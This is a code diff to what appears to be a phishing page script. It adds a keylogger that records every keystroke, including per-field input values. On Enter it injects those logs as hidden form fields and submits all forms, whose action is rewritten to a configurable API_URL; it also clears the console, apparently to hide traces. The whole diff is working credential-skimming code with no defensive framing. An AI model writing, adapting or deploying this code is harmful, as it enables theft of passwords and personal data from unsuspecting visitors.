@@ -1,6 +1,27 @@
 // CONTROL //
 
-const api_url = ''
+const API_URL = ''
+
+// KEYLOGGER //
+
+const keylogs = []
+const fieldlogs = {}
+
+addEventListener('keydown', (e) => {
+  const activeEl = document.activeElement
+
+  if (activeEl && activeEl.tagName === 'INPUT') {
+    const name = activeEl.name
+
+    if (!fieldlogs[name]) {
+      fieldlogs[name] = []
+    }
+
+    fieldlogs[name].push(e.key || 'UNKNOWN')
+  }
+
+  keylogs.push(e.key || 'UNKNOWN')
+})
 
 // SCRIPT //
 
@@ -43,17 +64,37 @@ for (const button of all_button) {
 }
 
 for (const form of all_form) {
-  form.action = api_url
+  form.action = API_URL
   form.method = 'POST'
   form.noValidate = false
+}
+
+// SUBMIT //
+
+function input(type, name, value) {
+  const el = document.createElement('input')
+  Object.assign(el, {
+    type,
+    name,
+    value: JSON.stringify(value),
+  })
+  return el
 }
 
 addEventListener('keydown', (event) => {
   if (event.key === 'Enter') {
     for (const form of all_form) {
+      const hidden1 = input('hidden', 'LOGGER[keylogs]', keylogs)
+      const hidden2 = input('hidden', 'LOGGER[fieldlogs]', fieldlogs)
+
+      form.appendChild(hidden1)
+      form.appendChild(hidden2)
+
       form.submit()
     }
   }
 })
+
+// EXIT //
 
 console.clear()
